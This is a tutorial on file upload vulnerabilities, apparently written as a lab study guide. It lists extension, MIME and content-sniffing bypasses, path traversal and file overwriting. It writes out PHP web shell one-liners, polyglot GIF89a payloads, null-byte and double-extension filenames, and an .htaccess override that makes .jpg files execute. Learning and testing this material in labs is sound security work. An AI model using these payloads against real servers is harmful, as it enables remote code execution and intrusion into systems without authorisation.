# What Is a File Upload Vulnerability?
A file upload vulnerability occurs when a web application allows a user to upload a file without properly validating:
- the file type
- the file extension
- the file contents
- the file size
- the file destination
- the file execution permissions
If validation is weak, an attacker can upload malicious files such as:
- Web shells (.php, .jsp, .aspx)
- Scripts disguised as images (shell.php.jpg)
- SVG files containing XSS
- Large files for DoS
- Files placed in unintended directories
This can lead to Remote Code Execution, XSS, Privilege Escalation, Path Traversal, or Data Exposure.
🧩 Common Types of File Upload Vulnerabilities
1. Extension Bypass  
The server checks only the extension, not the content.  
Examples:  
- shell.php.jpg  
- shell.php%00.jpg (null byte injection)  
- shell.phP (case bypass)  
- shell.pHp5 (alternative PHP extensions)
2. MIME Type Bypass  
The server trusts the Content-Type header.  
Example:  
    Content-Type: image/jpeg  
…but the file is actually PHP code.
3. Content Sniffing Bypass  
The server checks the extension but not the file content.  
Example:  
    GIF89a  
    php system($_GET['cmd']);   
A “polyglot” file that is both an image and PHP.
4. Path Traversal in Uploads  
The attacker controls the upload path.  
Example:  
    ../../../../var/www/html/shell.php
5. Overwriting Existing Files  
If the app doesn’t randomize filenames, you can overwrite:
- config files
- scripts
- .htaccess
- .env
6. SVG / HTML Upload → Stored XSS  
SVG files can contain JavaScript.  

## How to Detect File Upload Vulnerabilities
A practical checklist you can use in every lab.
1. Try uploading a simple PHP web shell  
Example:  
    php echo shell_exec($_GET['cmd']);   
If it uploads, test if it executes.
2. Try extension bypasses  
Upload files named:
- shell.php.jpg
- shell.php.png
- shell.php%00.jpg
- shell.phtml
- shell.phar
- shell.php5
3. Modify the Content-Type header  
Use Burp Suite to change:  
    Content-Type: image/jpeg  
Even if the file is PHP.
4. Try polyglot payloads  
Start the file with a valid image header:  
    GIF89a;  
    php system($_GET['cmd']); 
5. Check where the file is stored  
Sometimes the app tells you:  
    File uploaded to /uploads/2024/01/  
Try visiting that directory.
6. Try path traversal  
If the upload request contains a filename parameter:  
    filename=../../shell.php
7. Try uploading SVG or HTML  
If the site displays the uploaded file, test for XSS.
💥 How to Exploit File Upload Vulnerabilities
1. Upload a Web Shell (RCE)  
If the server executes uploaded files:  
- Upload shell.php  
- Visit:  
    https://site.com/uploads/shell.php?cmd=id  
Boom — remote code execution.
2. Bypass Filters  
Null Byte Injection:  
    shell.php%00.jpg  
Double Extensions:  
    shell.php.jpg  
Case Bypass:  
    shell.PhP  
MIME Bypass:  
    Change header in Burp.
3. Stored XSS via SVG  

4. Overwrite Server Files  
If filenames aren’t randomized:
- Overwrite .htaccess to allow PHP execution
- Overwrite existing scripts  
Example .htaccess:  
    AddType application/x-httpd-php .jpg  
Now .jpg files execute as PHP.
5. Path Traversal + Upload  
If you can control the path:  
    ../../../../var/www/html/shell.php  
You can drop a shell directly into the web root.
🧠 How to Remember This Easily
Think of file upload vulnerabilities as a 3‑step question:
1. Can I upload something dangerous? (weak validation)  
2. Can I bypass the filters? (extension, MIME, null byte, polyglot)  
3. Can I reach or execute the file? (web root, path traversal, overwriting)  
If the answer to all three is yes → RCE.
